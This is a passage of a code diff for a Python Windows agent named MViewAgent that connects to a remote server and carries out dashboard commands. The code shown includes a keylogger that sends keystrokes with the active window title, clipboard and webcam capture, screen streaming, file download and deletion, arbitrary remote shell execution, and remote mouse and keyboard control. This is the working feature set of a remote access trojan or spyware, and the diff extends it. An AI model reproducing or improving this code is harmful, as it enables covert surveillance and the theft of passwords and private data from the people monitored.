+                        "device_id":  CONFIG["DEVICE_TOKEN"],
+                        "frame":      frame_b64,
+                        "image":      frame_b64,
+                        "mode":       "screenshot",
+                        "w":          new_w,
+                        "h":          new_h,
+                        "mon_w":      mon_w,
+                        "mon_h":      mon_h,
+                        "cursor_x":   cx,
+                        "cursor_y":   cy,
+                        "clicking":   clicking,
+                        "click_type": click_type,
+                        "quality":    q,
+                        "ts":         datetime.utcnow().isoformat(),
                     })
+
                 except Exception as e:
-                    log.error(f"Stream frame error: {e}")
+                    log.error(f"Screenshot frame error: {e}")
+
                 elapsed = time.monotonic() - t0
-                sleep_t = max(0, interval - elapsed)
-                time.sleep(sleep_t)
+                time.sleep(max(0.001, interval - elapsed))
+
+    # ── Adaptive quality helper ───────────────────────────────────────────
+    def _adapt_quality(self):
+        """
+        If average frame time exceeds the target interval by >30%,
+        drop JPEG quality to reduce payload size and keep up.
+        Recovers quality when frames are fast again.
+        """
+        if len(self._frame_times) < 10:
+            return
+        avg = sum(self._frame_times) / len(self._frame_times)
+        target = 1.0 / self.fps
+        if avg > target * 1.3:
+            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 5)
+        elif avg < target * 0.8:
+            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 2)
 
 
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 #  SYSTEM TELEMETRY MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 class SystemMonitor:
     def __init__(self, sio_client):
         self.sio = sio_client
@@ -415,141 +700,102 @@ class SystemMonitor:
         if self.monitoring:
             return
         self.monitoring = True
-        self._thread = threading.Thread(
-            target=self._monitor_loop, args=(interval,), daemon=True
-        )
+        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
         self._thread.start()
-        log.info("System monitor started.")
 
     def stop(self):
         self.monitoring = False
 
     def get_snapshot(self) -> dict:
-        """Full system stats snapshot."""
-        vm = psutil.virtual_memory()
+        vm   = psutil.virtual_memory()
         disk = psutil.disk_usage("/")
-        net = psutil.net_io_counters()
-        cpu_per_core = psutil.cpu_percent(percpu=True)
-        battery = psutil.sensors_battery()
+        net  = psutil.net_io_counters()
+        bat  = psutil.sensors_battery()
 
         stats = {
-            "device_id":      CONFIG["DEVICE_TOKEN"],
-            "ts":             datetime.utcnow().isoformat(),
-
-            # CPU
-            "cpu_percent":    psutil.cpu_percent(interval=0.1),
-            "cpu_per_core":   cpu_per_core,
-            "cpu_count":      psutil.cpu_count(logical=True),
-            "cpu_freq_mhz":   round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
-
-            # Memory
-            "ram_total_gb":   round(vm.total    / (1024**3), 2),
-            "ram_used_gb":    round(vm.used     / (1024**3), 2),
-            "ram_free_gb":    round(vm.available/ (1024**3), 2),
-            "ram_percent":    vm.percent,
-
-            # Disk
-            "disk_total_gb":  round(disk.total / (1024**3), 2),
-            "disk_used_gb":   round(disk.used  / (1024**3), 2),
-            "disk_free_gb":   round(disk.free  / (1024**3), 2),
-            "disk_percent":   disk.percent,
-
-            # Network
-            "net_sent_mb":    round(net.bytes_sent / (1024**2), 2),
-            "net_recv_mb":    round(net.bytes_recv / (1024**2), 2),
+            "device_id":       CONFIG["DEVICE_TOKEN"],
+            "ts":              datetime.utcnow().isoformat(),
+            "cpu_percent":     psutil.cpu_percent(interval=0.1),
+            "cpu_per_core":    psutil.cpu_percent(percpu=True),
+            "cpu_count":       psutil.cpu_count(logical=True),
+            "cpu_freq_mhz":    round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
+            "ram_total_gb":    round(vm.total     / (1024**3), 2),
+            "ram_used_gb":     round(vm.used      / (1024**3), 2),
+            "ram_free_gb":     round(vm.available / (1024**3), 2),
+            "ram_percent":     vm.percent,
+            "disk_total_gb":   round(disk.total / (1024**3), 2),
+            "disk_used_gb":    round(disk.used  / (1024**3), 2),
+            "disk_free_gb":    round(disk.free  / (1024**3), 2),
+            "disk_percent":    disk.percent,
+            "net_sent_mb":     round(net.bytes_sent / (1024**2), 2),
+            "net_recv_mb":     round(net.bytes_recv / (1024**2), 2),
             "net_packets_sent": net.packets_sent,
             "net_packets_recv": net.packets_recv,
-
-            # Battery
-            "battery_pct":    battery.percent      if battery else None,
-            "battery_plug":   battery.power_plugged if battery else None,
-
-            # Uptime
-            "boot_time":      datetime.fromtimestamp(psutil.boot_time()).isoformat(),
-            "uptime_hrs":     round((time.time() - psutil.boot_time()) / 3600, 2),
+            "battery_pct":     bat.percent      if bat else None,
+            "battery_plug":    bat.power_plugged if bat else None,
+            "boot_time":       datetime.fromtimestamp(psutil.boot_time()).isoformat(),
+            "uptime_hrs":      round((time.time() - psutil.boot_time()) / 3600, 2),
         }
 
-        # Temperature (Windows — requires WMI)
-        if WMI_AVAILABLE:
+        if WMI_OK:
             try:
                 c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
-                sensors = c.Sensor()
-                temps = {s.Name: round(s.Value, 1) for s in sensors if s.SensorType == "Temperature"}
-                stats["temperatures"] = temps
+                stats["temperatures"] = {s.Name: round(s.Value, 1) for s in c.Sensor() if s.SensorType == "Temperature"}
             except Exception:
                 stats["temperatures"] = {}
-        else:
-            stats["temperatures"] = {}
-
-        # GPU (basic)
-        if WMI_AVAILABLE:
             try:
-                c = wmi.WMI()
-                gpu_list = []
-                for g in c.Win32_VideoController():
-                    gpu_list.append({
-                        "name":   g.Name,
-                        "driver": g.DriverVersion,
-                        "status": g.Status,
-                    })
-                stats["gpus"] = gpu_list
+                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion} for g in wmi.WMI().Win32_VideoController()]
             except Exception:
                 stats["gpus"] = []
+        else:
+            stats["temperatures"] = {}
+            stats["gpus"] = []
 
         return stats
 
     def get_disk_list(self) -> list:
-        """List all disk partitions with usage."""
         result = []
-        for part in psutil.disk_partitions(all=False):
+        for p in psutil.disk_partitions(all=False):
             try:
-                usage = psutil.disk_usage(part.mountpoint)
+                u = psutil.disk_usage(p.mountpoint)
                 result.append({
-                    "device":    part.device,
-                    "mountpoint": part.mountpoint,
-                    "fstype":    part.fstype,
-                    "total_gb":  round(usage.total / (1024**3), 2),
-                    "used_gb":   round(usage.used  / (1024**3), 2),
-                    "free_gb":   round(usage.free  / (1024**3), 2),
-                    "percent":   usage.percent,
+                    "device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype,
+                    "total_gb": round(u.total / (1024**3), 2),
+                    "used_gb":  round(u.used  / (1024**3), 2),
+                    "free_gb":  round(u.free  / (1024**3), 2),
+                    "percent":  u.percent,
                 })
             except Exception:
                 pass
         return result
 
     def get_network_interfaces(self) -> dict:
-        """All network interface addresses."""
         addrs = {}
         for iface, addr_list in psutil.net_if_addrs().items():
-            addrs[iface] = [
-                {"family": str(a.family), "address": a.address, "netmask": a.netmask}
-                for a in addr_list
-            ]
+            addrs[iface] = [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list]
         return addrs
 
-    def _monitor_loop(self, interval: int):
+    def _loop(self, interval):
         while self.monitoring:
             try:
-                stats = self.get_snapshot()
-                self.sio.emit("system_stats_report", stats)
+                self.sio.emit("system_stats_report", self.get_snapshot())
             except Exception as e:
-                log.error(f"System monitor error: {e}")
+                log.error(f"SysMonitor error: {e}")
             time.sleep(interval)
 
 
-# ════════════════════════════════════════════════════════════════
-#  PROCESS MANAGER MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  PROCESS MANAGER
+# ════════════════════════════════════════════════════════════════════════════
 class ProcessManager:
     @staticmethod
     def list_processes() -> list:
         procs = []
-        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
-                                       "memory_percent", "username", "create_time"]):
+        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent", "memory_percent", "username", "create_time"]):
             try:
                 info = p.info
-                info["memory_mb"] = round(p.memory_info().rss / (1024**2), 2)
-                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info["create_time"] else None
+                info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
+                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
                 procs.append(info)
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
@@ -564,7 +810,7 @@ class ProcessManager:
             time.sleep(0.5)
             if p.is_running():
                 p.kill()
-            return {"success": True, "message": f"Process '{name}' (PID {pid}) terminated."}
+            return {"success": True, "message": f"'{name}' (PID {pid}) terminated."}
         except psutil.NoSuchProcess:
             return {"success": False, "message": f"PID {pid} not found."}
         except psutil.AccessDenied:
@@ -575,32 +821,24 @@ class ProcessManager:
     @staticmethod
     def start_process(command: str) -> dict:
         try:
-            proc = subprocess.Popen(
-                command, shell=True,
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
         except Exception as e:
             return {"success": False, "message": str(e)}
 
 
-# ════════════════════════════════════════════════════════════════
-#  FILE BROWSER MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  FILE BROWSER
+# ════════════════════════════════════════════════════════════════════════════
 class FileBrowser:
-    MAX_UPLOAD_MB   = 50
-    CHUNK_SIZE      = 65536  # 64 KB chunks for file reading
+    MAX_UPLOAD_MB = 50
 
     @staticmethod
     def list_directory(path: str) -> dict:
-        """List contents of a directory."""
         try:
             p = Path(path)
-            if not p.exists():
-                return {"error": f"Path not found: {path}"}
-            if not p.is_dir():
-                return {"error": f"Not a directory: {path}"}
-
+            if not p.exists():   return {"error": f"Not found: {path}"}
+            if not p.is_dir():   return {"error": f"Not a directory: {path}"}
             entries = []
             for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                 try:
@@ -615,45 +853,27 @@ class FileBrowser:
                     })
                 except (PermissionError, OSError):
                     pass
-
-            return {
-                "path":    str(p),
-                "parent":  str(p.parent),
-                "entries": entries,
-                "count":   len(entries),
-            }
+            return {"path": str(p), "parent": str(p.parent), "entries": entries, "count": len(entries)}
         except Exception as e:
             return {"error": str(e)}
 
     @staticmethod
     def read_file(path: str, max_kb: int = 512) -> dict:
-        """Read a text file and return its content (up to max_kb)."""
         try:
             p = Path(path)
             if not p.is_file():
                 return {"error": "Not a file."}
             size_kb = p.stat().st_size / 1024
             if size_kb > max_kb:
-                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB limit)."}
-
-            # Try UTF-8 first, fall back to latin-1
-            try:
-                content = p.read_text(encoding="utf-8")
-            except UnicodeDecodeError:
-                content = p.read_text(encoding="latin-1")
-
-            return {
-                "path":    str(p),
-                "content": content,
-                "size_kb": round(size_kb, 2),
-                "lines":   content.count("\n"),
-            }
+                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
+            try:    content = p.read_text(encoding="utf-8")
+            except: content = p.read_text(encoding="latin-1")
+            return {"path": str(p), "content": content, "size_kb": round(size_kb, 2), "lines": content.count("\n")}
         except Exception as e:
             return {"error": str(e)}
 
     @staticmethod
     def download_file(path: str) -> dict:
-        """Read a binary file and return as base64."""
         try:
             p = Path(path)
             if not p.is_file():
@@ -661,13 +881,11 @@ class FileBrowser:
             size_mb = p.stat().st_size / (1024**2)
             if size_mb > FileBrowser.MAX_UPLOAD_MB:
                 return {"error": f"File too large ({size_mb:.1f} MB)."}
-
-            data_b64 = base64.b64encode(p.read_bytes()).decode()
             return {
                 "path":     str(p),
                 "filename": p.name,
                 "size_mb":  round(size_mb, 3),
-                "data":     data_b64,
+                "data":     base64.b64encode(p.read_bytes()).decode(),
             }
         except Exception as e:
             return {"error": str(e)}
@@ -680,92 +898,81 @@ class FileBrowser:
                 p.unlink()
                 return {"success": True, "message": f"Deleted: {path}"}
             elif p.is_dir():
-                import shutil
-                shutil.rmtree(str(p))
-                return {"success": True, "message": f"Deleted directory: {path}"}
-            else:
-                return {"success": False, "message": "Path not found."}
+                import shutil; shutil.rmtree(str(p))
+                return {"success": True, "message": f"Deleted dir: {path}"}
+            return {"success": False, "message": "Path not found."}
         except Exception as e:
             return {"success": False, "message": str(e)}
 
     @staticmethod
     def list_drives() -> list:
-        """List available drive letters (Windows)."""
         drives = []
-        for part in psutil.disk_partitions(all=False):
+        for p in psutil.disk_partitions(all=False):
             try:
-                usage = psutil.disk_usage(part.mountpoint)
+                u = psutil.disk_usage(p.mountpoint)
                 drives.append({
-                    "drive":    part.mountpoint,
-                    "total_gb": round(usage.total / (1024**3), 2),
-                    "free_gb":  round(usage.free  / (1024**3), 2),
-                    "percent":  usage.percent,
-                    "fstype":   part.fstype,
+                    "drive":    p.mountpoint,
+                    "total_gb": round(u.total / (1024**3), 2),
+                    "free_gb":  round(u.free  / (1024**3), 2),
+                    "percent":  u.percent,
+                    "fstype":   p.fstype,
                 })
             except Exception:
                 pass
         return drives
 
 
-# ════════════════════════════════════════════════════════════════
-#  SHELL MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  REMOTE SHELL
+# ════════════════════════════════════════════════════════════════════════════
 class RemoteShell:
-    TIMEOUT = 30  # seconds max per command
+    TIMEOUT = 30
 
     @staticmethod
     def execute(command: str, shell_type: str = "cmd") -> dict:
-        """Execute a shell command and return output."""
         t0 = time.time()
         try:
-            if shell_type == "powershell":
-                cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", command]
-            else:
-                cmd = command
-
+            cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", command] \
+                  if shell_type == "powershell" else command
             result = subprocess.run(
-                cmd,
-                shell=(shell_type == "cmd"),
-                capture_output=True,
-                text=True,
-                timeout=RemoteShell.TIMEOUT,
+                cmd, shell=(shell_type == "cmd"),
+                capture_output=True, text=True, timeout=RemoteShell.TIMEOUT
             )
-            elapsed = round(time.time() - t0, 3)
             return {
-                "success":   True,
-                "command":   command,
-                "stdout":    result.stdout[-8192:],  # cap at 8 KB
-                "stderr":    result.stderr[-4096:],
+                "success":    True,
+                "command":    command,
+                "stdout":     result.stdout[-8192:],
+                "stderr":     result.stderr[-4096:],
                 "returncode": result.returncode,
-                "elapsed_s": elapsed,
-                "ts":        datetime.utcnow().isoformat(),
+                "elapsed_s":  round(time.time() - t0, 3),
+                "ts":         datetime.utcnow().isoformat(),
             }
         except subprocess.TimeoutExpired:
-            return {"success": False, "command": command, "error": "Command timed out (30s)."}
+            return {"success": False, "command": command, "error": "Timed out (30s)."}
         except Exception as e:
             return {"success": False, "command": command, "error": str(e)}
 
 
-# ════════════════════════════════════════════════════════════════
-#  KEYLOGGER MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  KEYLOGGER — captures keystrokes + active window title
+# ════════════════════════════════════════════════════════════════════════════
 class KeyLogger:
     def __init__(self, sio_client):
-        self.sio  = sio_client
+        self.sio      = sio_client
         self._buf: list[str] = []
-        self._lock = threading.Lock()
+        self._lock    = threading.Lock()
         self._listener = None
-        self._flush_thread: threading.Thread | None = None
-        self.running = False
+        self._flush_t:  threading.Thread | None = None
+        self.running  = False
 
     def start(self):
-        if not INPUT_MONITOR_AVAILABLE or self.running:
+        if not PYNPUT_OK or self.running:
             return
         self.running = True
         self._listener = pynput.keyboard.Listener(on_press=self._on_key)
         self._listener.start()
-        self._flush_thread = threading.Thread(target=self._flush_loop, daemon=True)
-        self._flush_thread.start()
+        self._flush_t = threading.Thread(target=self._flush_loop, daemon=True)
+        self._flush_t.start()
         log.info("Keylogger started.")
 
     def stop(self):
@@ -776,17 +983,24 @@ class KeyLogger:
     def _on_key(self, key):
         try:
             with self._lock:
-                if hasattr(key, "char") and key.char:
-                    self._buf.append(key.char)
-                else:
-                    self._buf.append(f"[{str(key).replace('Key.', '')}]")
+                ch = key.char if hasattr(key, "char") and key.char else f"[{str(key).replace('Key.', '')}]"
+                self._buf.append(ch)
         except Exception:
             pass
 
+    def _active_window(self) -> str:
+        try:
+            hwnd = ctypes.windll.user32.GetForegroundWindow()
+            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+            buf = ctypes.create_unicode_buffer(length + 1)
+            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+            return buf.value
+        except Exception:
+            return ""
+
     def _flush_loop(self):
-        interval = CONFIG["KEYLOG_FLUSH_INTERVAL"]
         while self.running:
-            time.sleep(interval)
+            time.sleep(CONFIG["KEYLOG_FLUSH_INTERVAL"])
             self._flush()
 
     def _flush(self):
@@ -795,111 +1009,115 @@ class KeyLogger:
                 return
             text = "".join(self._buf)
             self._buf.clear()
+        try:
+            self.sio.emit("keylog_data", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "text":      text,
+                "window":    self._active_window(),
+                "ts":        datetime.utcnow().isoformat(),
+            })
+        except Exception:
+            pass
 
-        self.sio.emit("keylog_data", {
-            "device_id": CONFIG["DEVICE_TOKEN"],
-            "text":      text,
-            "ts":        datetime.utcnow().isoformat(),
-        })
 
-
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 #  CLIPBOARD MONITOR
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 class ClipboardMonitor:
     def __init__(self, sio_client):
-        self.sio = sio_client
+        self.sio   = sio_client
         self._last = ""
-        self._thread: threading.Thread | None = None
+        self._t:   threading.Thread | None = None
         self.running = False
 
     def start(self):
-        if not CLIPBOARD_AVAILABLE or self.running:
+        if not CLIPBOARD_OK or self.running:
             return
         self.running = True
-        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
-        self._thread.start()
-        log.info("Clipboard monitor started.")
+        self._t = threading.Thread(target=self._loop, daemon=True)
+        self._t.start()
 
     def stop(self):
         self.running = False
 
-    def _monitor_loop(self):
+    def _loop(self):
+        poll = CONFIG["CLIPBOARD_POLL_MS"] / 1000.0
         while self.running:
             try:
-                current = pyperclip.paste()
-                if current and current != self._last:
-                    self._last = current
+                cur = pyperclip.paste()
+                if cur and cur != self._last:
+                    self._last = cur
                     self.sio.emit("clipboard_data", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "content":   current[:4096],  # cap at 4 KB
-                        "length":    len(current),
+                        "content":   cur[:4096],
+                        "length":    len(cur),
                         "ts":        datetime.utcnow().isoformat(),
                     })
             except Exception:
                 pass
-            time.sleep(2)
+            time.sleep(poll)
 
 
-# ════════════════════════════════════════════════════════════════
-#  WEBCAM MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  WEBCAM CAPTURE
+# ════════════════════════════════════════════════════════════════════════════
 class WebcamCapture:
     def __init__(self, sio_client):
         self.sio = sio_client
 
     def capture(self, camera_idx: int = 0) -> dict:
-        if not WEBCAM_AVAILABLE:
-            return {"error": "OpenCV not available on this agent."}
+        if not CV2_OK:
+            return {"error": "OpenCV not available."}
         try:
-            cap = cv2.VideoCapture(camera_idx, cv2.CAP_DSHOW)
+            cap = cv2.VideoCapture(camera_idx)
             if not cap.isOpened():
-                return {"error": f"Camera {camera_idx} not available."}
+                return {"error": f"Camera {camera_idx} could not be opened."}
             ret, frame = cap.read()
             cap.release()
             if not ret:
-                return {"error": "Failed to capture frame."}
-            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
-            img_b64 = base64.b64encode(buf.tobytes()).decode()
+                return {"error": "Failed to read frame from camera."}
+            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 75])
+            if not success:
+                return {"error": "Encoding failed."}
             return {
-                "success":    True,
-                "device_id":  CONFIG["DEVICE_TOKEN"],
-                "camera_idx": camera_idx,
-                "image":      img_b64,
-                "ts":         datetime.utcnow().isoformat(),
+                "success":     True,
+                "camera_idx":  camera_idx,
+                "frame":       base64.b64encode(buf.tobytes()).decode(),
+                "w":           frame.shape[1],
+                "h":           frame.shape[0],
+                "ts":          datetime.utcnow().isoformat(),
             }
         except Exception as e:
             return {"error": str(e)}
 
-    def list_cameras(self) -> list:
-        """Probe camera indices 0-4."""
-        if not WEBCAM_AVAILABLE:
+    @staticmethod
+    def list_cameras() -> list:
+        if not CV2_OK:
             return []
-        available = []
-        for idx in range(5):
-            try:
-                cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
-                if cap.isOpened():
-                    available.append(idx)
+        cameras = []
+        for i in range(5):
+            cap = cv2.VideoCapture(i)
+            if cap.isOpened():
+                cameras.append({"index": i, "name": f"Camera {i}"})
                 cap.release()
-            except Exception:
-                pass
-        return available
+        return cameras
 
 
-# ════════════════════════════════════════════════════════════════
-#  HEARTBEAT MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  HEARTBEAT
+# ════════════════════════════════════════════════════════════════════════════
 class Heartbeat:
     def __init__(self, sio_client):
-        self.sio = sio_client
-        self._thread: threading.Thread | None = None
+        self.sio     = sio_client
+        self._t:     threading.Thread | None = None
         self.running = False
 
     def start(self):
+        if self.running:
+            return
         self.running = True
-        self._thread = threading.Thread(target=self._loop, daemon=True)
-        self._thread.start()
+        self._t = threading.Thread(target=self._loop, daemon=True)
+        self._t.start()
 
     def stop(self):
         self.running = False
@@ -909,22 +1127,26 @@ class Heartbeat:
             try:
                 self.sio.emit("heartbeat", {
                     "device_id": CONFIG["DEVICE_TOKEN"],
-                    "ts":        datetime.utcnow().isoformat(),
                     "cpu":       psutil.cpu_percent(interval=0),
                     "ram":       psutil.virtual_memory().percent,
+                    "ts":        datetime.utcnow().isoformat(),
                 })
             except Exception as e:
                 log.warning(f"Heartbeat error: {e}")
             time.sleep(CONFIG["HEARTBEAT_INTERVAL"])
 
 
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 #  MAIN AGENT CLASS
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 class MViewAgent:
     def __init__(self):
-        self.sio         = socketio.Client(logger=False, engineio_logger=False)
-        self.streamer    = ScreenStreamer(self.sio)
+        self.sio         = socketio.Client(
+            logger=False, engineio_logger=False,
+            reconnection=False,    # we handle reconnection manually
+        )
+        self.cursor      = CursorTracker(self.sio)
+        self.streamer    = ScreenStreamer(self.sio, self.cursor)
         self.sys_monitor = SystemMonitor(self.sio)
         self.keylogger   = KeyLogger(self.sio)
         self.clipboard   = ClipboardMonitor(self.sio)
@@ -939,7 +1161,7 @@ class MViewAgent:
 
         self._register_events()
 
-    # ── Socket Events ─────────────────────────────────────────────
+    # ── Socket Events ─────────────────────────────────────────────────────
     def _register_events(self):
         sio = self.sio
 
@@ -947,44 +1169,61 @@ class MViewAgent:
         def connect():
             self._connected       = True
             self._reconnect_delay = CONFIG["RECONNECT_BASE"]
-            log.info(f"Connected to server: {CONFIG['SERVER_URL']}")
-            # Announce with full fingerprint — ensure device_id is always the TOKEN
+            log.info(f"Connected to {CONFIG['SERVER_URL']}")
             fp = get_device_fingerprint()
-            fp["device_id"] = CONFIG["DEVICE_TOKEN"]   # guarantee server gets the right key
+            fp["device_id"] = CONFIG["DEVICE_TOKEN"]
             fp["token"]     = CONFIG["DEVICE_TOKEN"]
             sio.emit("agent_connect", fp)
-            # Start background services
             self.heartbeat.start()
-            if CONFIG["ENABLE_KEYLOGGER"]:  self.keylogger.start()
-            if CONFIG["ENABLE_CLIPBOARD"]:  self.clipboard.start()
+            self.cursor.start()
+            if CONFIG["ENABLE_KEYLOGGER"]: self.keylogger.start()
+            if CONFIG["ENABLE_CLIPBOARD"]: self.clipboard.start()
 
         @sio.event
         def disconnect():
             self._connected = False
-            log.warning("Disconnected from server.")
+            log.warning("Disconnected.")
             self.streamer.stop()
             self.sys_monitor.stop()
             self.heartbeat.stop()
 
-        # ── DASHBOARD COMMANDS ─────────────────────────────────────
+        # ── Dashboard Commands ─────────────────────────────────────────────
         @sio.on("request_action")
         def on_action(data):
             tab = data.get("tab", "")
-            log.info(f"Action requested: {tab}  params={data}")
+            log.info(f"Action: {tab}")
 
+            # ── Monitor / Stream ───────────────────────────────────────────
             if tab == "monitor":
                 action = data.get("action", "start")
                 if action == "start":
+                    # Dashboard can specify mode: "video" | "screenshot"
                     self.streamer.start(
-                        monitor=data.get("monitor", 1),
-                        fps=data.get("fps", CONFIG["STREAM_FPS"]),
-                        quality=data.get("quality", CONFIG["STREAM_QUALITY"]),
+                        monitor=data.get("monitor",  CONFIG["STREAM_MONITOR"]),
+                        fps=    data.get("fps",      CONFIG["STREAM_FPS"]),
+                        quality=data.get("quality",  CONFIG["STREAM_QUALITY"]),
+                        scale=  data.get("scale",    CONFIG["STREAM_SCALE"]),
+                        mode=   data.get("mode",     CONFIG["STREAM_MODE"]),
                     )
-                else:
+                elif action == "stop":
                     self.streamer.stop()
+                elif action == "set_mode":
+                    # Hot-switch between video and screenshot without restart
+                    self.streamer.set_mode(data.get("mode", "video"))
+                    sio.emit("action_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "action": "set_mode",
+                        "mode": self.streamer.mode,
+                        "success": True,
+                    })
+                elif action == "set_quality":
+                    q = int(data.get("quality", 55))
+                    self.streamer._quality_current = max(10, min(95, q))
+                elif action == "set_fps":
+                    self.streamer.fps = int(data.get("fps", 20))
 
+            # ── Single screenshot ──────────────────────────────────────────
             elif tab == "screenshot":
-                # Single on-demand screenshot — apply quality/scale from request
                 q = data.get("quality", CONFIG["STREAM_QUALITY"])
                 s = data.get("scale",   CONFIG["STREAM_SCALE"])
                 old_q, old_s = self.streamer.quality, self.streamer.scale
@@ -992,223 +1231,155 @@ class MViewAgent:
                 img = self.streamer.capture_single()
                 self.streamer.quality, self.streamer.scale = old_q, old_s
                 if img:
-                    w_info = None
-                    try:
-                        with mss.mss() as sct:
-                            mon = sct.monitors[min(self.streamer.monitor_idx, len(sct.monitors)-1)]
-                            w_info = (int(mon["width"]*s), int(mon["height"]*s))
-                    except Exception:
-                        pass
-                    payload = {
+                    sio.emit("screenshot_result", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "frame":     img,
-                        "image":     img,
-                        "ts":        datetime.utcnow().isoformat(),
-                    }
-                    if w_info:
-                        payload["w"], payload["h"] = w_info
-                    sio.emit("screenshot_result", payload)
+                        "frame": img, "image": img,
+                        "ts": datetime.utcnow().isoformat(),
+                    })
 
+            # ── Mouse ──────────────────────────────────────────────────────
             elif tab == "mouse_event":
-                if PYAUTOGUI_AVAILABLE:
-                    x, y    = int(data.get("x", 0)), int(data.get("y", 0))
-                    mtype   = data.get("type", "move")
-                    btn_map = {0: "left", 1: "middle", 2: "right"}
-                    btn     = btn_map.get(int(data.get("button", 0)), "left")
+                if PYAUTOGUI_OK:
+                    x   = int(data.get("x", 0))
+                    y   = int(data.get("y", 0))
+                    typ = data.get("type", "move")
+                    btn = {0: "left", 1: "middle", 2: "right"}.get(int(data.get("button", 0)), "left")
                     try:
-                        if mtype == "move":
-                            pyautogui.moveTo(x, y, duration=0, _pause=False)
-                        elif mtype == "down":
-                            pyautogui.mouseDown(x, y, button=btn, _pause=False)
-                        elif mtype == "up":
-                            pyautogui.mouseUp(x, y, button=btn, _pause=False)
-                        elif mtype == "rclick":
-                            pyautogui.click(x, y, button="right", _pause=False)
-                        elif mtype == "dblclick":
-                            pyautogui.doubleClick(x, y, _pause=False)
+                        if   typ == "move":     pyautogui.moveTo(x, y, duration=0, _pause=False)
+                        elif typ == "down":     pyautogui.mouseDown(x, y, button=btn, _pause=False)
+                        elif typ == "up":       pyautogui.mouseUp(x, y, button=btn, _pause=False)
+                        elif typ == "click":    pyautogui.click(x, y, button=btn, _pause=False)
+                        elif typ == "rclick":   pyautogui.click(x, y, button="right", _pause=False)
+                        elif typ == "dblclick": pyautogui.doubleClick(x, y, _pause=False)
+                        elif typ == "drag":
+                            tx, ty = int(data.get("tx", x)), int(data.get("ty", y))
+                            pyautogui.dragTo(tx, ty, duration=0.1, button=btn, _pause=False)
                     except Exception as e:
-                        log.warning(f"mouse_event error: {e}")
+                        log.warning(f"mouse_event: {e}")
 
+            # ── Scroll ─────────────────────────────────────────────────────
             elif tab == "scroll_event":
-                if PYAUTOGUI_AVAILABLE:
+                if PYAUTOGUI_OK:
                     try:
                         x, y = int(data.get("x", 0)), int(data.get("y", 0))
                         dy   = data.get("dy", 0)
-                        # pyautogui scroll: positive = up, negative = down
                         clicks = int(-dy / 100) if dy else 0
                         if clicks:
                             pyautogui.scroll(clicks, x=x, y=y, _pause=False)
                     except Exception as e:
-                        log.warning(f"scroll_event error: {e}")
+                        log.warning(f"scroll_event: {e}")
 
+            # ── Keyboard ───────────────────────────────────────────────────
             elif tab == "key_event":
-                if PYAUTOGUI_AVAILABLE:
+                if PYAUTOGUI_OK:
                     ktype = data.get("type", "down")
                     key   = data.get("key", "")
                     combo = data.get("combo", "")
+                    KEY_MAP = {
+                        "Enter":"enter","Backspace":"backspace","Tab":"tab",
+                        "Escape":"esc","Delete":"delete","Insert":"insert",
+                        "Home":"home","End":"end","PageUp":"pageup","PageDown":"pagedown",
+                        "ArrowUp":"up","ArrowDown":"down","ArrowLeft":"left","ArrowRight":"right",
+                        " ":"space","Control":"ctrl","Alt":"alt","Shift":"shift","Meta":"win",
+                        "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5","F6":"f6",
+                        "F7":"f7","F8":"f8","F9":"f9","F10":"f10","F11":"f11","F12":"f12",
+                    }
                     try:
                         if combo == "ctrl+alt+del":
-                            # Simulate via shell (safest on Windows)
-                            import subprocess
